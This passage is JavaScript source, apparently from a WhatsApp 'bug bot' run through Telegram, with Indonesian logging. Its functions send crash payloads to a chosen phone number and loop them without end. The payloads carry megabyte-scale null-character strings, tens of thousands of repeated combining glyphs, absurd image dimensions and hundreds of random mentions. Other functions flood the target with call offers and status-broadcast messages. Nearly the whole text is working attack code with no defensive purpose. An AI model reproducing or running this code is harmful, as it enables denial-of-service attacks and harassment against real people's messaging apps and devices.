              name: "galaxy_message",
              paramsJson: "\u0000".repeat(1045000),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

  } catch (err) {
    console.error(`[CycsixvLite] Gagal mengirim bug ke ${target}:`, err.message);
  }
}

async function BlankUi(target) {
  const Bella = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg?mms3=true",
              directPath: "/o1/v/t24/f2/m233/AQObCXPc2AEH2totMBS4GZgFn_RPGdyZKyS2q0907ggtKlAnbqRetIpxhvzlPLeThlEgcDMBeDfdNqfTO8RFyYcfKvKFkBzvj0yos9sJKg",
              mimetype: "image/jpeg",
              width: 99999999999999,
              height: 99999999999999,
              fileLength: 9999999999999,
              fileSha256: "1KOUrmLddsr6o9UL5rTte7SXgo/AFcsqSz3Go+noF20=",
              fileEncSha256: "3VSRuGlV95Aj9tHMQcUBgYR6Wherr1sT/FAAKbSUJ9Y=",
              mediaKeyTimestamp: 1753804634,
              mediaKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
            }
          },
          body: { 
            text: "Assalamualaikum Join Channel Ku Bang" + "ꦽ".repeat(50000),
          },
          contextInfo: {
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 700 }, () =>
            "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
          )
        ]
      },
          nativeFlowMessage: {            
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦽ".repeat(50000)
                })
              }
            ],
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, Bella, {
    messageId: "",
    participant: { jid: target },
    userJid: target
  });
}

async function Cycsi(sock, target) {
  while (true) {
    try {
      const msg1 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Sehat bro???", format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              },
              contextInfo: {
                entryPointConversionSource: "call_permission_request"
              }
            }
          }
        }
      }, {
        userJid: target,
        messageId: undefined,
        messageTimestamp: (Date.now() / 1000) | 0
      });

      await sock.relayMessage("status@broadcast", msg1.message, {
        messageId: msg1.key?.id || undefined,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }]
        }]
      }, { participant: target });
      const msg2 = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: { text: "Kontol", format: "BOLD" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
              },
              contextInfo: {
                entryPointConversionSource: "call_permission_request"
              }
            }
          }
        }
      }, {
        userJid: target,
        messageId: undefined,
        messageTimestamp: (Date.now() / 1000) | 0
      });

      await sock.relayMessage("status@broadcast", msg2.message, {
        messageId: msg2.key?.id || undefined,
        statusJidList: [target],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }]
        }]
      }, { participant: target });

      console.log(`Bug terkirim ke target: ${target}`);
      await new Promise(res => setTimeout(res, 300));
    } catch (err) {
      console.error("⚠️ Error Cycsi:", err.message);
      await new Promise(res => setTimeout(res, 1000));
    }
  }
}

async function stickerBella(sock, target, mention) {
  const sticker = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/d/f/A1B2C3D4E5F6G7H8I9J0.webp?ccb=11-4",
      mimetype: "image/webp",
      fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
      fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
      mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
      fileLength: 1173741,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true
    }
  };

    const msgSticker = generateWAMessageFromContent(
      target,
      { ephemeralMessage: { message: sticker, ephemeralExpiration: 86400 } },
      { userJid: sock.user?.id }
    );
    await sock.relayMessage(target, msgSticker.message, { messageId: msgSticker.key.id });

  while (true) {
    const image = {
      imageMessage: {
        url: "https://mmg.whatsapp.net/d/f/Z9Y8X7W6V5U4T3S2R1Q0.jpg?ccb=11-4",
        mimetype: "image/jpeg",
        fileSha256: "h8O0mH7mY2H0p0J8m4wq2EoX5J2mP2z9S3oG3y1b2nQ=",
        fileEncSha256: "Vgkq2c2c1m3Y8F0s7f8c3m9V1a2b3c4d5e6f7g8h9i0=",
        mediaKey: "4n0Ck3yVb6b4T2h1u8V7s6Q5p4O3i2K1l0M9n8B7v6A=",
        fileLength: 245781,
        directPath: "",
        mediaKeyTimestamp: "1743225419",
        jpegThumbnail: null,
        scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
        scanLengths: [2437, 17332],
        contextInfo: {
          mentionedJid: [
            target,
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
            )
          ],
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    };

    const msg = generateWAMessageFromContent(
      "status@broadcast",
      { ephemeralMessage: { message: { viewOnceMessage: { message: image } }, ephemeralExpiration: 86400 } },
      { userJid: sock.user?.id }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }
          ]
        }
      ]
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          statusMentionMessage: {
            message: {
              protocolMessage: {
                key: msg.key,
                type: 25
              }
            }
          }
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "\u0000".repeat(50000) },
              content: undefined
            }
          ]
        }
      );
    }
  }

  return { stickerId: msgSticker.key.id, statusId: msg.key.id };
}

async function PermenIphone(sock, target, mention) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "MY WIFE",
            matchedText: "͜",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 60,
            thumbnailWidth: 54,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.red(`BUG DIKIRIM KE => ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function OfferPopup(sock, target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer To Target:`, error));
    }
    try {
        await sock.offerCall(target, { video: true });
        console.log(chalk.red.bold(`Success Send Offer To Target`));
    } catch (error) {
        console.error(chalk.red.bold(`Failed Send Offer To Target:`, error));
    }
}

async function NodeDelay(sock, target, mention = true) {
  try {
    const mediaList = []

    for (let i = 1045000000; i <= 1045000000; i++) {
      mediaList.push({
        image: {
          url: "https://files.catbox.moe/qrqzlw.jpg",
          mimetype: "image/jpeg"
        },
        caption: "\u200B".repeat(50000) + i + "𑜦𑜠".repeat(10000) + "ꦽ".repeat(10000) + "ꦾ".repeat(10000) + "ោ៝".repeat(10000),

        mentions: mention ? [target] : [],

        footer: " ",
        templateButtons: [
          {
            index: 1,
            urlButton: {
              displayText: "𑜦𑜠".repeat(10000) + "ꦽ".repeat(10000) + "ꦾ".repeat(10000) + "ោ៝".repeat(10000),
              url: "https://wa.me/stickerpack/Xatanical"
            }
          }
        ],

        contextInfo: {
          ...(mention ? { mentionedJid: [target] } : {}),
          externalAdReply: {
            title: "𑜦𑜠".repeat(10000) + "ꦽ".repeat(10000) + "ꦾ".repeat(10000) + "ោ៝".repeat(10000),
            body: "𑜦𑜠".repeat(10000) + "ꦽ".repeat(10000) + "ꦾ".repeat(10000) + "ោ៝".repeat(10000),
            sourceUrl: "https://wa.me/stickerpack/Xatanical",
            mediaType: 1,
            showAdAttribution: true
          }
        }
      })
    }

    for (const media of mediaList) {
      await sock.sendMessage(target, media)
      if (mention) {
        await sock.sendMessage("status@broadcast", media)
      }
    }

  } catch (error) {
  }
}


async function websiteasddpi(durationHours, target) {
    const totalDurationMs = durationHours * 60 * 60 * 500;
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`Stopped after sending ${count} messages`);
            return;
        }

        try {
            if (count < 1000) {
                await Qivisix(sock, target);
                await new Promise((resolve) => setTimeout(resolve, 1000));
                await Cycsi(target);
                await new Promise((resolve) => setTimeout(resolve, 1000));
                await glowInvis(target);
                await new Promise((resolve) => setTimeout(resolve, 1000));
                await NodeDelay(sock, target);
                await new Promise((resolve) => setTimeout(resolve, 1000));
                await NodeDelay(target);
                await new Promise((resolve) => setTimeout(resolve, 1000));
                await NodeDelay(sock, target);
                await new Promise((resolve) => setTimeout(resolve, 1000));

                console.log(
                    chalk.red(`Website Send bug ${count}/1000 ${target}`)
                );
                count++;
                setTimeout(sendNext, 500);
            } else {
                console.log(chalk.green(`✅ Success Sending 1000 messages to ${target}`));
                count = 0;
                console.log(chalk.red("➡️ Next 500 Messages"));
                setTimeout(sendNext, 150);
            }
        } catch (error) {
            console.error(`❌ Error saat mengirim: ${error.message}`);

            setTimeout(sendNext, 100);
        }
    };

    sendNext();
}

//


bot.launch()



